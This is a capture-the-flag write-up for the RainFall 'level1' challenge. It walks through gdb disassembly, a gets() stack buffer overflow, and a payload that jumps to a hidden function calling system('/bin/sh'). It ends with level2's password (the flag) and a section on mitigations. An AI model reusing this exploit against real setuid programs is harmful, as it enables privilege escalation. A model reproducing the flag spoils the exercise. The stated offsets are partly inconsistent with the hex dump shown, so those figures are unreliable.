# Level 1

## Initial Analysis

### 1. Examine the Binary
```bash
level1@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level1 level1   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level1 level1 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
-rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
-rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile

level1@RainFall:~$ file level1
level1: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x099e580e4b9d2f1ea30ee82a22229942b231f2e0, not stripped
```

**Key observations:**
- **setuid and setgid binary** (s flags in permissions)
- Owned by **level2** user
- When executed, runs with **level2 privileges**

### 2. Test Basic Execution Behavior
```bash
level1@RainFall:~$ ./level1
hello
[program exits silently - no output]

level1@RainFall:~$ ./level1 test arguments
input test
[program exits silently - no output]

level1@RainFall:~$ echo "test" | ./level1  
[program exits silently - no output]
```

**Initial Pattern Discovery:**
- **Waits for input**: Program doesn't exit immediately, waits for user input
- **No visible output**: Program accepts input but produces no output
- **Arguments ignored**: Command line arguments don't affect behavior
- **Silent termination**: Program exits without any indication of what it does

**Critical Insight**: The program reads input but doesn't appear to do anything with it. This suggests there might be hidden functionality or vulnerabilities.

## Reverse Engineering - Discovering the Hidden Architecture

### 3. Function Analysis - Uncovering Hidden Functions
```bash
level1@RainFall:~$ gdb level1
(gdb) info functions
All defined functions:
Non-debugging symbols:
0x08048340  gets@plt        ← Dangerous input function!
0x08048350  fwrite@plt      ← Output function
0x08048360  system@plt      ← System command execution!
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run             ← Hidden function!
0x08048480  main
```

**Critical Function Discovery:**
- **gets@plt**: Dangerous input function with no bounds checking
- **system@plt**: System command execution capability
- **Hidden function run()**: At address 0x08048444, not called in normal execution
- **fwrite@plt**: Suggests the hidden function might produce output

### 4. Analyzing the Main Function
```bash
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:     push   %ebp
   0x08048481 <+1>:     mov    %esp,%ebp
   0x08048483 <+3>:     and    $0xfffffff0,%esp
   0x08048486 <+6>:     sub    $0x50,%esp        # Allocate 80 bytes
   0x08048489 <+9>:     lea    0x10(%esp),%eax   # Buffer at ESP+16
   0x0804848d <+13>:    mov    %eax,(%esp)       # Push buffer address
   0x08048490 <+16>:    call   0x8048340 <gets@plt>  # gets(buffer) - VULNERABLE!
   0x08048495 <+21>:    leave
   0x08048496 <+22>:    ret
End of assembler dump.
```

**Main Function Analysis:**
- **Stack allocation**: 80 bytes (0x50) of local space
- **Buffer location**: ESP+16 (0x10 offset from stack pointer)
- **gets() call**: Reads input without bounds checking - VULNERABILITY!
- **No other logic**: Just reads input and returns

**The Vulnerability Discovery:**
```
Stack Layout:
Total space: 80 bytes
Buffer starts: ESP+16
Buffer size: 80 - 16 = 64 bytes

Critical Issue: gets() has no bounds checking!
If input > 64 bytes → buffer overflow → stack corruption
```

### 5. Analyzing the Hidden Function
```bash
(gdb) disas run
Dump of assembler code for function run:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     sub    $0x18,%esp
   0x0804844a <+6>:     mov    0x80497c0,%eax    # Load global variable
   0x0804844f <+11>:    mov    %eax,%edx
   0x08048451 <+13>:    mov    $0x8048570,%eax   # Load message string
   0x08048456 <+18>:    mov    %edx,0xc(%esp)    # 4th param: stream
   0x0804845a <+22>:    movl   $0x13,0x8(%esp)   # 3rd param: count = 19
   0x08048462 <+30>:    movl   $0x1,0x4(%esp)    # 2nd param: size = 1
   0x0804846a <+38>:    mov    %eax,(%esp)       # 1st param: message
   0x0804846d <+41>:    call   0x8048350 <fwrite@plt>  # fwrite(msg, 1, 19, stream)
   0x08048472 <+46>:    movl   $0x8048584,(%esp) # Load command string
   0x08048479 <+53>:    call   0x8048360 <system@plt>  # system("/bin/sh")!
   0x0804847e <+58>:    leave
   0x0804847f <+59>:    ret

(gdb) x/s 0x8048584
0x8048584:  "/bin/sh"
(gdb) x/s 0x8048570
0x8048570:  "Good... Wait what?\n"
```

**Hidden Function Analysis:**
- **Function run() at 0x08048444**: Contains the functionality we want!
- **Prints message**: "Good... Wait what?" using fwrite()
- **Executes shell**: system("/bin/sh") - provides shell access!
- **Never called**: No code path in main() leads to this function

**The Exploitation Goal**: Redirect program execution to run() function.

## Understanding the Buffer Overflow Attack

### 6. Stack Layout Analysis
```bash
(gdb) break *main+16
(gdb) run
Breakpoint 1, 0x08048490 in main ()

(gdb) info registers
esp            0xbffff750
ebp            0xbffff7a8

(gdb) x/20wx $esp
0xbffff750:     0xbffff760      0x0000002f      0xbffff7ac      0xb7fd0ff4
0xbffff760:     0x080484a0      0x0804978c      0x00000001      0x08048321  ← Buffer start (ESP+16)
0xbffff770:     0xb7fd13e4      0x00080000      0x0804978c      0x080484c1
0xbffff780:     0xffffffff      0xb7e5edc6      0xb7fd0ff4      0xb7e5ee55
0xbffff790:     0xb7fed280      0x00000000      0x080484a9      0xb7fd0ff4
```

**Stack Memory Layout:**
```
Memory Layout Analysis:
ESP = 0xbffff750 (stack pointer)
EBP = 0xbffff7a8 (base pointer)
Buffer = ESP+16 = 0xbffff760

Distance Calculation:
From buffer start to saved EBP: 0xbffff7a8 - 0xbffff760 = 72 bytes
From buffer start to return address: 72 + 4 = 76 bytes

Stack Structure:
[Buffer: 64 bytes][Unused: 8 bytes][Saved EBP: 4 bytes][Return Address: 4 bytes]
```

### 7. Buffer Overflow Distance Testing
```bash
(gdb) run <<< $(python -c 'print "A"*80')
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

**Buffer Overflow Confirmation:**
- **0x41414141 = "AAAA"**: Confirms we're overwriting the return address
- **Segfault on return**: Program crashes when trying to return to 0x41414141
- **Control achieved**: We can control where the program jumps

### 8. Calculating the Exact Offset

- **Total stack space**: 0x50 (80 bytes).
- **Buffer starts at  esp + 0x10 (16 bytes in).**
- **Buffer size**:  80 - 16 = 64 bytes .
- **Pattern**: 76 bytes filler + 4 bytes target address
- **Target**: 0x08048444 (address of run function)

## Exploitation Implementation

### 9. Crafting the Exploit Payload
```bash
# Target address: 0x08048444 (run function)
# Little-endian format: \x44\x84\x04\x08

# Create payload file
level1@RainFall:~$ python -c "print('A' * 76 + '\x44\x84\x04\x08')" > /tmp/payload

# Check payload content
level1@RainFall:~$ xxd /tmp/payload
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
...
00000040: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000050: 4484 0408 0a                             D....

# Total: 76 A's + 4 bytes address + newline = 81 bytes
```

**Payload Structure:**
- **76 bytes padding**: Fill buffer and reach return address
- **4 bytes target**: 0x08048444 (run function address)
- **Little-endian**: Intel x86 byte order (least significant byte first)

### 10. Testing the Exploit
```bash
# Test in GDB first
(gdb) run < /tmp/payload
Starting program: /home/user/level1/level1 < /tmp/payload
Good... Wait what?

Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()
```

**Partial Success:**
- **"Good... Wait what?" message**: Confirms we reached run() function!
- **fwrite() executed**: Message was printed successfully
- **system() called**: But shell didn't work properly in GDB environment

### 11. Execute the Final Exploit
```bash
# Use the payload with cat to maintain shell session
level1@RainFall:~$ (cat /tmp/payload; cat) | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

**Success!**
1. **Buffer overflow executed**: 76 bytes overflowed the buffer
2. **Return address hijacked**: Program jumped to run() instead of normal return
3. **Hidden function called**: run() function executed successfully  
4. **Message displayed**: "Good... Wait what?" confirmed execution
5. **Shell obtained**: system("/bin/sh") provided interactive shell
6. **Privilege escalation**: Shell running with level2 privileges
7. **Flag retrieved**: Access to level2 password achieved

### 12. Understanding the Execution Flow
```bash
# Step-by-step execution analysis:

1. main() allocates 80-byte stack frame
   Buffer at ESP+16, return address at EBP+4

2. gets() reads 80 bytes from payload:
   - First 76 bytes fill buffer and overwrite saved EBP
   - Last 4 bytes (0x08048444) overwrite return address

3. main() executes leave/ret:
   - leave restores stack frame
   - ret pops return address (now 0x08048444) and jumps there

4. Execution transfers to run() function:
   - Prints "Good... Wait what?" message
   - Calls system("/bin/sh")
   - Provides interactive shell with level2 privileges
```

## Educational Analysis - Classic Buffer Overflow Concepts

### 13. Buffer Overflow Fundamentals

**The Classic Vulnerability:**
- **gets() function**: Reads unlimited input without bounds checking
- **Stack buffer**: Fixed-size buffer allocated on function stack
- **Adjacent data**: Return address stored after buffer on stack
- **Overflow condition**: Input longer than buffer corrupts adjacent memory

**Stack-Based Exploitation:**
- **Return address hijacking**: Most common stack overflow technique
- **Control flow redirection**: Change where program execution continues
- **Function pointer corruption**: Alternative to return address attacks
- **Stack canaries**: Modern protection against stack overflows

### 14. Why This Attack Works

**Vulnerable Conditions:**
- **No bounds checking**: gets() function inherently unsafe
- **Predictable stack layout**: Fixed offsets enable precise targeting
- **No stack protection**: No canaries or stack cookies
- **Executable stack**: No NX bit protection (older system)
- **No ASLR**: Predictable memory addresses

**Attack Requirements:**
- **Exact offset knowledge**: Must know precise distance to return address
- **Target address**: Need address of beneficial code (run function)
- **Payload delivery**: Method to provide oversized input
- **Little-endian format**: Correct byte order for target architecture

### 15. Modern Protection Mechanisms

**Stack Protection Evolution:**
- **Stack canaries**: Random values detect stack corruption
- **NX bit**: Non-executable stack prevents code injection
- **ASLR**: Address randomization prevents predictable targeting
- **Stack guards**: Compiler-generated overflow detection
- **Control Flow Integrity**: Hardware-assisted return address validation

**Safe Programming Practices:**
```c
// Vulnerable pattern:
char buffer[64];
gets(buffer);          // No bounds checking!

// Safer alternatives:
char buffer[64];
fgets(buffer, sizeof(buffer), stdin);  // Size-limited input
// or
char buffer[64];
if (scanf("%63s", buffer) != 1) {      // Size-limited with validation
    // Handle error
}
```

### 16. Real-World Relevance

**Historical Impact:**
- **Morris Worm (1988)**: Used buffer overflow in fingerd
- **Code Red (2001)**: Buffer overflow in IIS web server
- **Slammer (2003)**: SQL Server buffer overflow

**Modern Applications:**
- **Legacy systems**: Older software still vulnerable
- **Embedded devices**: Limited protection mechanisms
- **IoT security**: Resource-constrained environments
- **Vulnerability research**: Foundation for advanced techniques